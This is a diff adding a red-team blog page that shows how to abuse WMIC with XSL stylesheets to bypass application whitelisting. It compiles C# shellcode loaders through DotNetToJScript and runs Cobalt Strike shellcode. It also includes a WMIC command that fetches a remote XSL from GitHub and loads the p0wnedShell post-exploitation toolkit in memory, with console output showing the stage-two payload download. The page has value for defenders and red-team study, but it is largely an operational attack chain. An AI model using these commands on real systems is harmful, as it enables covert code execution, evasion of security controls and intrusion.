@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="your description">
+    <meta name="Author" content="Rasta Mouse">
+    <meta name="keywords" content="offensive security">
+    <link rel="stylesheet" href=https://rastamouse.me/css/syntax.css>
+    <link rel="stylesheet" href=https://rastamouse.me/css/style.css>
+    <script src="https://kit.fontawesome.com/1b7478c139.js" crossorigin="anonymous"></script>
+    <title>Cheesy Rumbles</title>
+  </head><body><aside id="sidenav">
+    <header>
+    
+        <a href=https://rastamouse.me><img src="https://rastamouse.me/avatar.png" alt="avatar"></a>
+        
+    
+
+    <a id="branding" href=https://rastamouse.me>
+        
+            Cheesy Rumbles
+        
+    </a>
+    </header>
+
+    <nav>
+        
+            		
+            <a href="/"
+                
+            >
+                <i class="fas fa-home fa-sm"></i>
+                <span>home</span>
+            </a>
+        
+            		
+            <a href="/blog/"
+                
+            >
+                <i class="fas fa-keyboard fa-ms"></i>
+                <span>blog</span>
+            </a>
+        
+            		
+            <a href="/tags"
+                
+            >
+                <i class="fas fa-tags fa-ms"></i>
+                <span>tags</span>
+            </a>
+        
+            		
+            <a href="https://twitter.com/_RastaMouse"
+                
+                    target="_blank"
+                
+            >
+                <i class="fab fa-twitter fa-ms"></i>
+                <span>twitter</span>
+            </a>
+        
+            		
+            <a href="https://github.com/rasta-mouse"
+                
+                    target="_blank"
+                
+            >
+                <i class="fab fa-github fa-ms"></i>
+                <span>github</span>
+            </a>
+        
+            		
+            <a href="/index.xml"
+                
+            >
+                <i class="fas fa-rss fa-ms"></i>
+                <span>RSS</span>
+            </a>
+        
+    </nav>
+</aside>
+<main id="main">
+            <a href="javascript:void(0)" id="closebtn" onclick="navToggle()"><i class="fas fa-bars fa-lg"></i></a>
+            <div class="content">
+    
+    <h1 id="title">CSharp, DotNetToJScript, XSL</h1>
+    
+      
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#example-1">Example 1</a>
+      <ul>
+        <li><a href="#32-bit-shellcode">32-bit Shellcode</a></li>
+        <li><a href="#compile-to-dll">Compile to DLL</a></li>
+        <li><a href="#dotnettojscript">DotNetToJScript</a></li>
+        <li><a href="#xsl">XSL</a></li>
+      </ul>
+    </li>
+    <li><a href="#example-2">Example 2</a>
+      <ul>
+        <li><a href="#p0wnedshell">p0wnedShell</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    <p>In April 2018, <a href="https://twitter.com/subTee">Casey Smith</a> published a finding he dubbed <a href="http://subt0x11.blogspot.co.uk/2018/04/wmicexe-whitelisting-bypass-hacking.html">squiblytwo</a>, which detailed how WMIC can be used to invoke arbitary code contained in the extensible stylesheet language (XSL) format.</p>
+<p>The technique has some notable attractions:</p>
+<ul>
+<li>AWL bypass</li>
+<li>Execute when Windows Script Host is blocked</li>
+<li>Utilise JScript (DotNetToJScript hotness)</li>
+<li>Load XSL locally or from a URL</li>
+<li>WMIC is proxy aware (and works over TLS)</li>
+</ul>
+<p>I encourage you to read through Casey&rsquo;s original post before proceeding here.</p>
+<p>The goal of this post is to walk through how you can take your own C#, run it through DotNetToJScript, and throw the output into XSL format.</p>
+<h2 id="example-1">Example 1</h2>
+<h3 id="32-bit-shellcode">32-bit Shellcode</h3>
+<p>For this example we&rsquo;re going to execute 32-bit shellcode for a Cobalt Strike HTTP listener, using <a href="https://twitter.com/Arno0x0x">Arno0x0x&rsquo;s</a> <a href="https://github.com/Arno0x/CSharpScripts/blob/master/shellcodeLauncher.cs">shellcodeLauncher</a> as a template.  The only thing we need to add is a constructor for the Program class.</p>
+<p>Replace line 25 with your shellcode of choice.</p>
+<!-- raw HTML omitted -->
+<h3 id="compile-to-dll">Compile to DLL</h3>
+<p><code>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -unsafe -platform:x86 -target:library shellcode.cs</code></p>
+<p>It&rsquo;s probably good practice to test your payload every step of the way.  So before compiling to a DLL, compile to an EXE and run it to make sure it works as expected.</p>
+<h3 id="dotnettojscript">DotNetToJScript</h3>
+<p>Next, provide the DLL to DotNetToJScript.  Remember to modify the entry class if you&rsquo;re using a different namespace and class name.</p>
+<p><code>DotNetToJScript.exe -c ShellCodeLauncher.Program -o C:\Tools\shellcode.js C:\Tools\shellcode.dll</code></p>
+<p>You can test the <code>js</code> file using <code>cscript</code> but because we&rsquo;re outputting to 32-bit, we need to use the one in <code>SysWOW64</code>.</p>
+<p><code>C:\Windows\SysWOW64\cscript.exe C:\Tools\shellcode.js</code></p>
+<h3 id="xsl">XSL</h3>
+<p>The final step is to wrap the <code>js</code> in the tags required by XSL.  We can use the squiblytwo PoC as a template.</p>
+<!-- raw HTML omitted -->
+<p>Final result should look something like this.</p>
+<!-- raw HTML omitted -->
+<p>Again, because it&rsquo;s 32-bit, we need the <code>SysWOW64 wmic</code> to execute.</p>
+<p><code>C:\Windows\SysWOW64\wbem\WMIC.exe os get /format:&quot;C:\Tools\shellcode.xsl&quot;</code></p>
+<figure>
+    <img src="/images/xsl/beacon.png"/> 
+</figure>
+
+<h2 id="example-2">Example 2</h2>
+<h3 id="p0wnedshell">p0wnedShell</h3>
+<p><a href="https://github.com/Cn33liz/p0wnedShell">p0wnedShell</a> is a well-known PowerShell runspace post exploitation toolkit written in C#, that can run PowerShell commands and functions within a runspace environment without using powershell.exe.  <a href="https://github.com/Cn33liz/p0wnedLoader">p0wnedLoader</a> is probably less well know and is not maintained with the main p0wnedShell repo.  It enables you to download an AES encrypted version of p0wnedShell, decrypt it, then run it from memory.</p>
+<p>For the purposes of this post, we&rsquo;ll just use the old p0wnedShell in the p0wnedLoader repo - of course, you can compile and encrypt your own version with <code>p0wnedEncrypt</code>.</p>
+<p>As before, <a href="https://github.com/rasta-mouse/p0wnedLoader/blob/master/p0wnedLoader.cs">modify</a> p0wnedLoader to provide a constructor for DotNetToJScript, then repeat the same steps in Example 1 to compile <code>p0wnedLoader.cs</code> to a DLL, run DotNetToJScript and put it in XSL format.</p>
+<p>If we also host the XSL online, we can run the entire thing without touching disk.</p>
+<p><code>C:\Windows\System32\wbem\WMIC.exe os get /format:&quot;https://raw.githubusercontent.com/rasta-mouse/p0wnedLoader/master/p0wnedLoader.xsl&quot;</code></p>
+<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">          ___                     ____                __
+    ___  / _ \_    _____  ___ ___/ / /  ___  ___ ____/ /__ ____
+   / _ \/ // / |/|/ / _ \/ -_) _  / /__/ _ \/ _ `/ _  / -_) __/
+  / .__/\___/|__,__/_//_/\__/\_,_/____/\___/\_,_/\_,_/\__/_/
+ /_/
+
+           Loads an Online AES Encrypted version of p0wnedShell
+                                                By Cn33liz 2016
+
+
+[*] Please enter the p0wnedShell Stage2 URL &gt; https://raw.githubusercontent.com/Cn33liz/p0wnedLoader/master/p0wnedShellx64.enc
+
+[*] One moment while getting our Stage2 payload.... -&gt; Done
+
+[*] Now please enter our Decryption Password &gt; **********
+</code></pre></div><figure>
+    <img src="/images/xsl/p0wnedShell.png"/> 
+</figure>
+
+<p>Et voila.</p>
+    
+    <div class="nav-next-prev">
+        <div class="nav-prev">
+            
+                <a href="https://rastamouse.me/blog/brucon-18/"><i class="fas fa-chevron-left"></i></a>
+            
+        </div>
+        <a class="nav-top" href="#">top</i></a>
+        <div class="nav-next">
+            
+                <a href="https://rastamouse.me/blog/rdpclip/"><i class="fas fa-chevron-right"></i></a>
+            
+        </div>
+    </div>
+    
+
+            </div><footer>
+<div class="footer-content">
+
+
+<p class="copyright meta">This work is licensed under a Creative Commons Attribution-ShareAlike 4.0 International License.</p>
+
+</div>
+</footer></main>
+    </body>
+    <script src=https://rastamouse.me/js/navbutton.js></script>
+</html>
